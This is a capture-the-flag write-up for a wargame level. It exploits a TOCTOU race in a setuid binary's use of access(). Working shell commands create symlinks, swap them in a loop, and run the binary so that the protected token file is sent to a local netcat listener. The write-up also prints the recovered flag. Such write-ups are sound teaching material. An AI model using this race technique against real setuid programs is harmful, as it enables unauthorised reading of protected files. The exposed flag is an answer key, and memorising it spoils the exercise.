## level10

1. Check files in current working directory (home dir)
    - `-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10`
    - `-rw-------  1 flag10 flag10     26 Mar  5  2016 token`

Using `strings` on the binary reveals a connection to the port `6969` (`Connecting to %s:6969 ..`)

We can send indeed pretty much any file, except for the `token` file.

But, using `nm -Dgu ./level10` reveals the usage of the function `access` (used to check if we have read permissions on a file).

`access` is known for being vulnerable to a TOCTOU (Time Of Check to Time Of Use) attack.

Exploit explanation :

1. Create a dummy file in `/tmp/dummy`
2. Create a symlink to the `token` file to `/tmp/race_cond`
3. Run `./level10` binary in a background loop (using another ssh connection or a tmux session)
4. Swap the symlink to the `token` file to the `dummy` file back and forth in a loop
5. Wait until the binary checks for the permissions of the `/tmp/dummy` file, and then the file gets swapped to the `token` file, and the binary reads it and sends it to the server.

### Setup of the exploit

```bash
touch /tmp/dummy
ln -s ~/token /tmp/race_cond
```

### Running the netcat server

On a tmux window :
```bash
nc -kl 6969 # -k : keep listening
```

### Swapping loop

On another tmux window :

```bash
while true; do ln -sf /tmp/dummy /tmp/race_cond; ln -sf ~/token /tmp/race_cond; done
```

### Running the binary

And in a last tmux window :

```bash
while true; do ./level10 /tmp/race_cond 127.0.0.1; done
```

And finally, we get the flag `woupa2yuojeeaaed06riuj63c`